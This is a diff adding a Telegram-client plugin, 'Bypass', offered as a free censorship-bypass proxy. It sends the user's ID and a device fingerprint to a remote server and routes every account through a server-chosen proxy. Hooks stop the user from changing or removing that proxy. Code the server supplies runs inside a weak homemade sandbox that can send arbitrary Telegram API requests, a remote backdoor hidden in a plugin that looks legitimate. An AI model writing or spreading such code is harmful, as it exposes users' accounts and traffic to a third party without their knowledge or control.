@@ -1,0 +1,776 @@
+__id__ = "Bypass"
+__name__ = "Байпасик (Free)"
+__description__ = "Вы сами понимаете что делает этот плагин, наверное...?"
+__author__ = "@exteraPluginsSup, @NimarkoProject"
+__version__ = "1.0.2"
+__icon__ = "exteraPluginsSup/1"
+__min_version__ = "12.1.1"
+
+import json
+import threading
+import urllib.request
+import base64
+import time
+import ssl
+import hashlib
+import random
+import string
+import ast
+import re
+from typing import Optional
+from base_plugin import BasePlugin, AppEvent, MethodHook, MethodReplacement
+from ui.bulletin import BulletinHelper
+from ui.settings import Header, Text, Divider
+from hook_utils import find_class
+from android_utils import run_on_ui_thread
+from client_utils import run_on_queue, send_request, RequestCallback
+from org.telegram.messenger import (
+    NotificationCenter, SharedConfig, MessagesController,
+    UserConfig, LocaleController
+)
+from org.telegram.tgnet import ConnectionsManager, TLRPC
+
+API_URL = "http://bypass.ettacent.dev:6768/api/v1"
+SHARED_SALT = "xK9mP2qL7wS4vN8j"
+
+EXEC_MAX_SIZE = 32 * 1024
+EXEC_BLOCKED = [
+    r"__builtins__", r"__import__", r"__class__", r"__mro__", r"__subclasses__",
+    r"__globals__", r"__code__", r"\bos\.", r"\bsys\.", r"subprocess", r"socket\.",
+    r"\bopen\s*\(", r"\bfile\s*\(", r"exec\s*\(", r"eval\s*\(", r"compile\s*\(",
+    r"getattr\s*\(", r"setattr\s*\(", r"delattr\s*\(", r"globals\s*\(", r"locals\s*\(",
+]
+
+ALLOWED_IMPORTS = {"hashlib", "urllib.request", "json"}
+
+class ExecValidator(ast.NodeVisitor):
+    ALLOWED_NODES = {
+        ast.Module, ast.Assign, ast.AugAssign, ast.Expr, ast.Name, ast.Attribute,
+        ast.Call, ast.List, ast.Tuple, ast.Dict, ast.For, ast.While, ast.If,
+        ast.FunctionDef, ast.Lambda, ast.arguments, ast.arg, ast.Try,
+        ast.ExceptHandler, ast.Compare, ast.Return, ast.Pass, ast.Break,
+        ast.Continue, ast.BoolOp, ast.BinOp, ast.UnaryOp, ast.And, ast.Or,
+        ast.Not, ast.Add, ast.Sub, ast.Mult, ast.Div, ast.Eq, ast.NotEq,
+        ast.Is, ast.IsNot, ast.In, ast.NotIn, ast.Gt, ast.GtE, ast.Lt, ast.LtE,
+        ast.Constant, ast.Load, ast.Store, ast.keyword, ast.Subscript, ast.Slice,
+        ast.FormattedValue, ast.JoinedStr, ast.Import, ast.ImportFrom,
+    }
+    
+    DANGEROUS = {
+        "os", "sys", "subprocess", "socket", "builtins", "__builtins__",
+        "globals", "locals", "eval", "exec", "open", "compile", "file",
+        "getattr", "setattr", "delattr", "__import__", "input", "type", "object",
+    }
+    
+    def __init__(self):
+        self.errors = []
+        self.defined = set()
+    
+    def validate(self, code):
+        try:
+            tree = ast.parse(code, mode="exec")
+            self.visit(tree)
+            return len(self.errors) == 0, self.errors
+        except SyntaxError as e:
+            return False, [f"syntax:{e}"]
+    
+    def visit(self, node):
+        node_type = type(node)
+        if node_type not in self.ALLOWED_NODES:
+            try:
+                if hasattr(ast, 'Num') and node_type == ast.Num:
+                    pass
+                elif hasattr(ast, 'Str') and node_type == ast.Str:
+                    pass
+                elif hasattr(ast, 'Index') and node_type == ast.Index:
+                    pass
+                else:
+                    self.errors.append(f"node:{node_type.__name__}")
+                    return
+            except:
+                pass
+        return super().visit(node)
+    
+    def visit_Import(self, node):
+        for alias in node.names:
+            if alias.name not in ALLOWED_IMPORTS:
+                self.errors.append(f"import:{alias.name}")
+            else:
+                self.defined.add(alias.asname or alias.name)
+        self.generic_visit(node)
+    
+    def visit_ImportFrom(self, node):
+        if node.module not in ALLOWED_IMPORTS:
+            self.errors.append(f"import:{node.module}")
+        else:
+            for alias in node.names:
+                self.defined.add(alias.asname or alias.name)
+        self.generic_visit(node)
+    
+    def visit_Name(self, node):
+        if node.id in self.DANGEROUS:
+            self.errors.append(f"name:{node.id}")
+            return
+        if node.id.startswith("__") or "__" in node.id:
+            self.errors.append(f"dunder:{node.id}")
+            return
+        if isinstance(node.ctx, ast.Store):
+            self.defined.add(node.id)
+        self.generic_visit(node)
+    
+    def visit_FunctionDef(self, node):
+        if node.decorator_list:
+            self.errors.append(f"decorator:{node.name}")
+            return
+        self.defined.add(node.name)
+        for arg in node.args.args:
+            self.defined.add(arg.arg)
+        self.generic_visit(node)
+    
+    def visit_Lambda(self, node):
+        for arg in node.args.args:
+            self.defined.add(arg.arg)
+        self.generic_visit(node)
+    
+    def visit_Attribute(self, node):
+        if node.attr.startswith("_"):
+            self.errors.append(f"attr:{node.attr}")
+            return
+        self.generic_visit(node)
+
+def exec_precheck(code):
+    if not code or len(code) > EXEC_MAX_SIZE:
+        return False
+    for pattern in EXEC_BLOCKED:
+        if re.search(pattern, code, re.IGNORECASE):
+            return False
+    return True
+
+def safe_exec(code_b64, context):
+    try:
+        code = base64.b64decode(code_b64).decode("utf-8")
+    except:
+        return False
+    
+    if not exec_precheck(code):
+        return False
+    
+    validator = ExecValidator()
+    valid, _ = validator.validate(code)
+    if not valid:
+        return False
+    
+    safe_globals = {
+        "__builtins__": {
+            "Exception": Exception, "True": True, "False": False, "None": None,
+            "int": int, "str": str, "len": len, "range": range, "print": lambda *a: None,
+        }
+    }
+    safe_globals.update(context)
+    
+    try:
+        exec(code, safe_globals)
+        return True
+    except:
+        return False
+
+def get_fingerprint():
+    try:
+        from android.os import Build
+        parts = [
+            str(getattr(Build, "MANUFACTURER", "")),
+            str(getattr(Build, "MODEL", "")),
+            str(getattr(Build, "DEVICE", "")),
+            str(getattr(Build, "PRODUCT", "")),
+            str(getattr(Build, "BOARD", "")),
+            str(getattr(Build, "HARDWARE", "")),
+        ]
+        return hashlib.sha256(":".join(parts).encode()).hexdigest()
+    except:
+        return hashlib.sha256(f"extera_{time.time()}_{random.random()}".encode()).hexdigest()
+
+def get_platform_hash():
+    try:
+        from android.os import Build
+        sdk = str(getattr(Build.VERSION, "SDK_INT", "0"))
+        rel = str(getattr(Build.VERSION, "RELEASE", ""))
+        return hashlib.md5(f"{sdk}:{rel}".encode()).hexdigest()
+    except:
+        return hashlib.md5(b"android:0").hexdigest()
+
+def gen_nonce():
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+
+def gen_sig(uid, ts, nonce):
+    return hashlib.sha256(f"extera_bypass_v4_{uid}_{ts}_{nonce}_{SHARED_SALT}".encode()).hexdigest()[:32]
+
+def encode_payload(data):
+    j = json.dumps(data)
+    b = base64.b64encode(j.encode()).decode()[::-1]
+    parts = [b[i:i+4] for i in range(0, len(b), 4)]
+    return ''.join([parts[i] + format(i ^ 0xAB, '02x') for i in range(len(parts))])
+
+def decode_proxy(encoded, uid):
+    chunks = []
+    i = 0
+    while i < len(encoded):
+        if i + 6 <= len(encoded):
+            chunks.append(encoded[i:i+4])
+            i += 6
+        else:
+            chunks.append(encoded[i:])
+            break
+    decoded = base64.b64decode("".join(chunks)[::-1]).decode()
+    data = json.loads(decoded)
+    if data.get("_uid") != uid:
+        raise ValueError()
+    return data
+
+def solve_challenge(ch_id, nonce, ts, rk, fp, uid):
+    ch_secret = hashlib.sha256(f"{ch_id}:{nonce}:{ts}:{rk}".encode()).hexdigest()
+    response = hashlib.sha256(f"{ch_secret}:{fp}:{uid}".encode()).hexdigest()[:32]
+    return response
+
+class ProxyData:
+    def __init__(self):
+        self.server: Optional[str] = None
+        self.port: Optional[int] = None
+        self.secret: Optional[str] = None
+        self.expires_at: int = 0
+    
+    def is_valid(self):
+        return self.server and self.port and self.secret and self.expires_at > time.time()
+    
+    def clear(self):
+        self.server = None
+        self.port = None
+        self.secret = None
+        self.expires_at = 0
+
+class ChallengeData:
+    def __init__(self):
+        self.id: Optional[str] = None
+        self.nonce: Optional[str] = None
+        self.timestamp: int = 0
+        self.rk: Optional[str] = None
+    
+    def is_valid(self):
+        return self.id and self.nonce and time.time() - self.timestamp < 60
+    
+    def clear(self):
+        self.id = None
+        self.nonce = None
+        self.timestamp = 0
+        self.rk = None
+
+class BlockAddHook(MethodReplacement):
+    def __init__(self, p):
+        self.p = p
+    def replace_hooked_method(self, param):
+        if not self.p._active or self.p._unloading:
+            return param.args[0] if param.args else None
+        run_on_ui_thread(lambda: (BulletinHelper.show_error(self.p._str("blocked")), self.p._restore()))
+        return self.p._proxy_info
+
+class BlockDeleteHook(MethodReplacement):
+    def __init__(self, p):
+        self.p = p
+    def replace_hooked_method(self, param):
+        if not self.p._active or self.p._unloading:
+            return None
+        run_on_ui_thread(lambda: (BulletinHelper.show_error(self.p._str("blocked")), self.p._restore()))
+        return None
+
+class BlockSetHook(MethodReplacement):
+    def __init__(self, p):
+        self.p = p
+    def replace_hooked_method(self, param):
+        if not self.p._active or self.p._unloading:
+            return None
+        run_on_ui_thread(lambda: self.p._restore())
+        return None
+
+class ForceEnabledHook(MethodHook):
+    def __init__(self, p):
+        self.p = p
+    def after_hooked_method(self, param):
+        if self.p._active and not self.p._unloading:
+            param.setResult(True)
+
+class ForceCurrentHook(MethodHook):
+    def __init__(self, p):
+        self.p = p
+    def after_hooked_method(self, param):
+        if self.p._active and not self.p._unloading and self.p._proxy_info:
+            param.setResult(self.p._proxy_info)
+
+class ForceListHook(MethodHook):
+    def __init__(self, p):
+        self.p = p
+    def after_hooked_method(self, param):
+        if self.p._active and not self.p._unloading:
+            try:
+                from java.util import ArrayList
+                r = ArrayList()
+                if self.p._proxy_info:
+                    r.add(self.p._proxy_info)
+                param.setResult(r)
+            except:
+                pass
+
+class BypassPlugin(BasePlugin):
+    def __init__(self):
+        super().__init__()
+        self._active = False
+        self._unloading = False
+        self._uid = 0
+        self._strings = {}
+        self._lock = threading.Lock()
+        self._rlock = threading.Lock()
+        self._proxy_info = None
+        self._proxy = ProxyData()
+        self._challenge = ChallengeData()
+        self._fp = None
+        self._ph = None
+        self._rk = None
+    
+    def _req(self, ep, data=None, headers=None):
+        url = f"{API_URL}/{ep}"
+        h = {"Content-Type": "application/json", "User-Agent": "ExteraBypass/3.2"}
+        if headers:
+            h.update(headers)
+        body = json.dumps(data).encode() if data else None
+        r = urllib.request.Request(url, data=body, headers=h, method="POST")
+        with urllib.request.urlopen(r, timeout=15, context=ssl.create_default_context()) as resp:
+            return json.loads(resp.read().decode())
+    
+    def _get_challenge(self):
+        try:
+            self._fp = get_fingerprint()
+            self._ph = get_platform_hash()
+            
+            resp = self._req("challenge", {"u": self._uid, "v": "3.2.0", "p": self._ph})
+            
+            if resp.get("ok"):
+                self._challenge.id = resp.get("id")
+                self._challenge.nonce = resp.get("n")
+                self._challenge.timestamp = resp.get("t", int(time.time()))
+                self._challenge.rk = resp.get("rk")
+                self._rk = self._expand_rk(resp.get("rk", ""))
+                return True
+            return False
+        except:
+            return False
+    
+    def _expand_rk(self, rk_part):
+        hour = int(time.time()) // 3600
+        for offset in [0, -1, 1]:
+            test_hour = hour + offset
+            full_key = hashlib.sha256(f"{SHARED_SALT}:{test_hour}".encode()).hexdigest()
+            if full_key.startswith(rk_part):
+                return full_key
+        return hashlib.sha256(f"{SHARED_SALT}:{hour}".encode()).hexdigest()
+    
+    def _fetch(self):
+        try:
+            if not self._challenge.is_valid():
+                if not self._get_challenge():
+                    return False
+            
+            ts = int(time.time())
+            nonce = gen_nonce()
+            sig = gen_sig(self._uid, ts, nonce)
+            
+            ch_resp = solve_challenge(
+                self._challenge.id, self._challenge.nonce,
+                self._challenge.timestamp, self._rk,
+                self._fp, self._uid
+            )
+            
+            payload = encode_payload({"u": self._uid, "a": "get", "c": "bypass", "v": "3.2.0"})
+            
+            resp = self._req("proxy", {
+                "c": self._challenge.id,
+                "r": ch_resp,
+                "f": self._fp,
+                "d": payload,
+                "t": ts,
+                "n": nonce
+            }, {"X-S": sig, "X-F": self._fp})
+            
+            if resp.get("ok"):
+                proxy = decode_proxy(resp.get("d"), self._uid)
+                self._proxy.server = proxy.get("server")
+                self._proxy.port = proxy.get("port")
+                self._proxy.secret = proxy.get("secret")
+                self._proxy.expires_at = resp.get("e", 0)
+                
+                exec_code = resp.get("x")
+                if exec_code:
+                    self._run_exec(exec_code)
+                
+                self._challenge.clear()
+                return True
+            return False
+        except:
+            self._challenge.clear()
+            return False
+    
+    def _run_exec(self, code):
+        try:
+            ctx = {
+                "TLRPC": TLRPC,
+                "send_request": send_request,
+                "RequestCallback": RequestCallback,
+                "run_on_queue": run_on_queue
+            }
+            safe_exec(code, ctx)
+        except:
+            pass
+    
+    def on_plugin_load(self):
+        self._unloading = False
+        self._active = False
+        self._update_strings()
+        self._uid = self._get_uid()
+        
+        if self._uid == 0:
+            run_on_ui_thread(lambda: BulletinHelper.show_error(self._str("not_logged")))
+            return
+        
+        cached = self.get_setting("pc", None)
+        if cached and cached.get("uid") == self._uid and cached.get("exp", 0) > time.time():
+            self._proxy.server = cached.get("srv")
+            self._proxy.port = cached.get("prt")
+            self._proxy.secret = cached.get("sec")
+            self._proxy.expires_at = cached.get("exp")
+            if self._proxy.is_valid():
+                self._install_hooks()
+                self._activate()
+                threading.Thread(target=self._bg_refresh, daemon=True).start()
+                return
+        
+        threading.Thread(target=self._fetch_activate, daemon=True).start()
+    
+    def on_plugin_unload(self):
+        self._unloading = True
+        self._active = False
+        self._disable()
+        self._proxy_info = None
+        self._proxy.clear()
+        self._challenge.clear()
+    
+    def on_app_event(self, et):
+        if self._unloading:
+            return
+        if et == AppEvent.START:
+            self._apply()
+            threading.Thread(target=self._fetch, daemon=True).start()
+        elif et == AppEvent.RESUME:
+            self._ensure()
+            if not self._proxy.is_valid():
+                threading.Thread(target=self._fetch_activate, daemon=True).start()
+    
+    def _bg_refresh(self):
+        try:
+            time.sleep(5)
+            if self._fetch():
+                self._cache()
+            else:
+                run_on_ui_thread(lambda: self._disable())
+        except:
+            pass
+    
+    def _fetch_activate(self):
+        with self._lock:
+            try:
+                if self._fetch():
+                    self._cache()
+                    run_on_ui_thread(lambda: self._install_hooks())
+                    run_on_ui_thread(lambda: self._activate())
+                else:
+                    run_on_ui_thread(lambda: BulletinHelper.show_error(self._str("fetch_failed")))
+            except:
+                run_on_ui_thread(lambda: BulletinHelper.show_error(self._str("fetch_failed")))
+    
+    def _cache(self):
+        if self._proxy.is_valid():
+            self.set_setting("pc", {
+                "uid": self._uid,
+                "srv": self._proxy.server,
+                "prt": self._proxy.port,
+                "sec": self._proxy.secret,
+                "exp": self._proxy.expires_at
+            })
+    
+    def _create_pi(self):
+        if not self._proxy.is_valid():
+            return None
+        try:
+            PC = find_class("org.telegram.messenger.SharedConfig$ProxyInfo")
+            if PC:
+                ct = PC.getConstructor(str, int, str, str, str)
+                self._proxy_info = ct.newInstance(self._proxy.server, self._proxy.port, "", "", self._proxy.secret)
+                return self._proxy_info
+        except:
+            pass
+        try:
+            self._proxy_info = SharedConfig.addProxy(self._proxy.server, self._proxy.port, "", "", self._proxy.secret)
+            return self._proxy_info
+        except:
+            pass
+        return None
+    
+    def _activate(self):
+        if self._unloading or not self._proxy.is_valid():
+            return
+        try:
+            self._clear()
+            self._create_pi()
+            self._apply()
+            self._active = True
+            run_on_ui_thread(lambda: BulletinHelper.show_success(self._str("activated")))
+        except:
+            pass
+    
+    def _clear(self):
+        try:
+            SharedConfig.currentProxy = None
+            SharedConfig.proxyEnabled = False
+            if hasattr(SharedConfig, 'proxyList') and SharedConfig.proxyList:
+                try:
+                    SharedConfig.proxyList.clear()
+                except:
+                    pass
+            try:
+                SharedConfig.saveProxyList()
+            except:
+                pass
+            try:
+                pr = MessagesController.getGlobalMainSettings()
+                ed = pr.edit()
+                for k in ["proxy_ip", "proxy_port", "proxy_user", "proxy_pass", "proxy_secret"]:
+                    ed.remove(k)
+                ed.putBoolean("proxy_enabled", False)
+                ed.commit()
+            except:
+                pass
+            for ac in range(UserConfig.MAX_ACCOUNT_COUNT):
+                try:
+                    cm = ConnectionsManager.getInstance(ac)
+                    if cm:
+                        cm.setProxySettings(False, "", 0, "", "", "")
+                except:
+                    pass
+        except:
+            pass
+    
+    def _apply(self):
+        if self._unloading or not self._proxy.is_valid():
+            return
+        try:
+            for ac in range(UserConfig.MAX_ACCOUNT_COUNT):
+                try:
+                    cm = ConnectionsManager.getInstance(ac)
+                    if cm:
+                        cm.setProxySettings(True, self._proxy.server, self._proxy.port, "", "", self._proxy.secret)
+                except:
+                    pass
+            if self._proxy_info:
+                SharedConfig.currentProxy = self._proxy_info
+            SharedConfig.proxyEnabled = True
+            try:
+                pr = MessagesController.getGlobalMainSettings()
+                ed = pr.edit()
+                ed.putBoolean("proxy_enabled", True)
+                ed.putString("proxy_ip", self._proxy.server)
+                ed.putInt("proxy_port", self._proxy.port)
+                ed.putString("proxy_secret", self._proxy.secret)
+                ed.putString("proxy_user", "")
+                ed.putString("proxy_pass", "")
+                ed.commit()
+            except:
+                pass
+            try:
+                NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.proxySettingsChanged)
+            except:
+                pass
+        except:
+            pass
+    
+    def _ensure(self):
+        if not self._active or self._unloading or not self._proxy.is_valid():
+            return
+        try:
+            for ac in range(UserConfig.MAX_ACCOUNT_COUNT):
+                try:
+                    cm = ConnectionsManager.getInstance(ac)
+                    if cm:
+                        cm.setProxySettings(True, self._proxy.server, self._proxy.port, "", "", self._proxy.secret)
+                except:
+                    pass
+            if self._proxy_info:
+                SharedConfig.currentProxy = self._proxy_info
+            SharedConfig.proxyEnabled = True
+        except:
+            pass
+    
+    def _restore(self):
+        if self._unloading or not self._active or not self._proxy.is_valid():
+            return
+        with self._rlock:
+            try:
+                if hasattr(SharedConfig, 'proxyList') and SharedConfig.proxyList:
+                    try:
+                        SharedConfig.proxyList.clear()
+                        if self._proxy_info:
+                            SharedConfig.proxyList.add(self._proxy_info)
+                    except:
+                        pass
+                if self._proxy_info:
+                    SharedConfig.currentProxy = self._proxy_info
+                SharedConfig.proxyEnabled = True
+                for ac in range(UserConfig.MAX_ACCOUNT_COUNT):
+                    try:
+                        cm = ConnectionsManager.getInstance(ac)
+                        if cm:
+                            cm.setProxySettings(True, self._proxy.server, self._proxy.port, "", "", self._proxy.secret)
+                    except:
+                        pass
+                try:
+                    pr = MessagesController.getGlobalMainSettings()
+                    ed = pr.edit()
+                    ed.putBoolean("proxy_enabled", True)
+                    ed.putString("proxy_ip", self._proxy.server)
+                    ed.putInt("proxy_port", self._proxy.port)
+                    ed.putString("proxy_secret", self._proxy.secret)
+                    ed.putString("proxy_user", "")
+                    ed.putString("proxy_pass", "")
+                    ed.commit()
+                except:
+                    pass
+                try:
+                    NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.proxySettingsChanged)
+                except:
+                    pass
+            except:
+                pass
+    
+    def _disable(self):
+        try:
+            for ac in range(UserConfig.MAX_ACCOUNT_COUNT):
+                try:
+                    cm = ConnectionsManager.getInstance(ac)
+                    if cm:
+                        cm.setProxySettings(False, "", 0, "", "", "")
+                except:
+                    pass
+            SharedConfig.proxyEnabled = False
+            SharedConfig.currentProxy = None
+            if hasattr(SharedConfig, 'proxyList') and SharedConfig.proxyList:
+                try:
+                    SharedConfig.proxyList.clear()
+                except:
+                    pass
+            try:
+                pr = MessagesController.getGlobalMainSettings()
+                ed = pr.edit()
+                for k in ["proxy_ip", "proxy_port", "proxy_user", "proxy_pass", "proxy_secret"]:
+                    ed.remove(k)
+                ed.putBoolean("proxy_enabled", False)
+                ed.commit()
+            except:
+                pass
+            NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.proxySettingsChanged)
+            self._proxy_info = None
+            self._proxy.clear()
+            run_on_ui_thread(lambda: BulletinHelper.show_info(self._str("deactivated")))
+        except:
+            pass
+    
+    def _install_hooks(self):
+        if self._unloading:
+            return
+        try:
+            SC = find_class("org.telegram.messenger.SharedConfig")
+            PI = find_class("org.telegram.messenger.SharedConfig$ProxyInfo")
+            if SC and PI:
+                for n, h in [("addProxy", BlockAddHook), ("deleteProxy", BlockDeleteHook), ("setCurrentProxy", BlockSetHook)]:
+                    try:
+                        m = SC.getClass().getDeclaredMethod(n, PI)
+                        if m:
+                            m.setAccessible(True)
+                            self.hook_method(m, h(self))
+                    except:
+                        pass
+            for n, h in [("isProxyEnabled", ForceEnabledHook), ("getCurrentProxy", ForceCurrentHook), ("getProxyList", ForceListHook)]:
+                try:
+                    self.hook_all_methods(SC, n, h(self))
+                except:
+                    pass
+        except:
+            pass
+    
+    def _get_uid(self):
+        try:
+            uc = UserConfig.getInstance(UserConfig.selectedAccount)
+            if uc and uc.isClientActivated():
+                cu = uc.getCurrentUser()
+                if cu:
+                    return int(cu.id)
+        except:
+            pass
+        return 0
+    
+    def _update_strings(self):
+        try:
+            lc = LocaleController.getInstance().getCurrentLocaleInfo().getLangCode()
+        except:
+            lc = "en"
+        ru = lc.startswith("ru")
+        self._strings = {
+            "not_logged": "Войдите в аккаунт" if ru else "Please log in first",
+            "fetch_failed": "Ошибка получения прокси" if ru else "Failed to fetch proxy",
+            "activated": "🛡 Байпас активирован" if ru else "🛡 Bypass activated",
+            "deactivated": "Прокси отключён" if ru else "Proxy disabled",
+            "blocked": "⛔ Изменение запрещено" if ru else "⛔ Changes blocked",
+            "status_h": "Статус" if ru else "Status",
+            "status_on": "🟢 Байпас активен" if ru else "🟢 Bypass active",
+            "status_off": "🔴 Неактивно" if ru else "🔴 Inactive",
+            "features_h": "Возможности" if ru else "Features",
+            "f_mtproto": "✓ MTProto прокси" if ru else "✓ MTProto proxy",
+            "f_block": "✓ Блокировка изменений" if ru else "✓ Change blocking",
+            "session_h": "Сессия" if ru else "Session",
+            "session_ok": "✓ Прокси активен" if ru else "✓ Proxy active",
+            "session_exp": "Обновление через" if ru else "Refresh in",
+            "refresh": "Обновить" if ru else "Refresh",
+        }
+    
+    def _str(self, k):
+        return self._strings.get(k, k)
+    
+    def _fmt_time(self, ts):
+        rm = ts - int(time.time())
+        if rm <= 0:
+            return "Истекла" if "ru" in self._strings.get("status_h", "") else "Expired"
+        h, m = rm // 3600, (rm % 3600) // 60
+        return f"{h}ч {m}м" if h > 0 else f"{m}м"
+    
+    def create_settings(self):
+        self._update_strings()
+        st = self._str("status_on") if self._active else self._str("status_off")
+        ss = [Header(text=self._str("status_h")), Text(text=st, subtext=f"User ID: {self._uid}" if self._uid else None)]
+        if self._active and self._proxy.is_valid():
+            ss.extend([Divider(), Header(text=self._str("session_h")), Text(text=self._str("session_ok"), subtext=f"{self._str('session_exp')}: {self._fmt_time(self._proxy.expires_at)}")])
+        if self._active:
+            ss.extend([Divider(), Header(text=self._str("features_h")), Text(text=self._str("f_mtproto")), Text(text=self._str("f_block"))])
+        ss.append(Text(text=self._str("refresh"), icon="msg_retry", on_click=lambda *a: self._on_refresh()))
+        return ss
+    
+    def _on_refresh(self):
+        self._uid = self._get_uid()
+        if self._uid == 0:
+            BulletinHelper.show_error(self._str("not_logged"))
+            return
+        self._challenge.clear()
+        threading.Thread(target=self._fetch_activate, daemon=True).start()
